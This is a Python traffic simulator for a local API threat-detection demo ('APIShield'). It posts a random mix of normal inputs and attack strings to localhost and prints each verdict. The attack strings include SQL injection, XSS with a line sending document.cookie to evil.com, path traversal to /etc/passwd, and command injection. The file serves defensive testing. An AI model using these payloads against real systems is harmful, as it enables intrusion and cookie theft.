"""
traffic_sim.py  —  APIShield Live Traffic Simulator
Sends realistic mixed traffic (threats + normal) to the FastAPI server
every few seconds so the dashboard shows real-time updates.
"""

import random
import time
import urllib.request
import json

API_URL   = "http://localhost:8000/analyze"
INTERVAL  = (3, 7)   # seconds between requests (random range)

# ── Payloads ──────────────────────────────────────────────────────────────────
PAYLOADS = [
    # SQL Injection
    {"input_text": "' UNION SELECT username,password FROM users--",  "endpoint": "/api/v1/login"},
    {"input_text": "SELECT * FROM request_logs WHERE id=1",          "endpoint": "/api/v1/search"},
    {"input_text": "1' OR '1'='1",                                   "endpoint": "/api/v1/users"},
    {"input_text": "DROP TABLE users; --",                            "endpoint": "/api/v1/admin"},

    # XSS
    {"input_text": "<script>alert('xss')</script>",                  "endpoint": "/api/v1/comments"},
    {"input_text": "javascript:fetch('http://evil.com?c='+document.cookie)", "endpoint": "/api/v1/search"},
    {"input_text": "<img src=x onerror=alert(1)>",                   "endpoint": "/api/v1/profile"},

    # Path Traversal
    {"input_text": "../../etc/passwd",                                "endpoint": "/api/v1/files"},
    {"input_text": "; whoami",                                        "endpoint": "/api/v1/exec"},
    {"input_text": "cmd.exe /c dir",                                  "endpoint": "/api/v1/run"},

    # Normal traffic
    {"input_text": "hello world",                                     "endpoint": "/api/v1/health"},
    {"input_text": "search term",                                     "endpoint": "/api/v1/products"},
    {"input_text": "user@example.com",                                "endpoint": "/api/v1/login"},
    {"input_text": "page=1&limit=20",                                 "endpoint": "/api/v1/orders"},
    {"input_text": "filter=active&sort=date",                         "endpoint": "/api/v1/users"},
]

print("=" * 55)
print("  APIShield Traffic Simulator")
print("  Sending requests to http://localhost:8000")
print("  Watch the dashboard at http://localhost:8501")
print("  Press Ctrl+C to stop")
print("=" * 55)
print()

count = 0
while True:
    payload = random.choice(PAYLOADS)
    body    = json.dumps(payload).encode()

    try:
        req = urllib.request.Request(
            API_URL,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read())
            count += 1
            action  = data.get("action", "?")
            threat  = data.get("threat_type", "Normal")
            risk    = data.get("risk_score", 0)
            ep      = payload["endpoint"]
            status  = "🔴 BLOCK" if action=="BLOCK" else ("🟡 ALERT" if action=="ALERT" else ("🔵 MONITOR" if action=="MONITOR" else "🟢 ALLOW"))
            print(f"  [{count:>3}]  {status:<12}  risk={risk:<3}  {threat:<25}  {ep}")

    except Exception as e:
        print(f"  [ERR]  {e} — is FastAPI running on port 8000?")

    sleep_time = random.uniform(*INTERVAL)
    time.sleep(sleep_time)
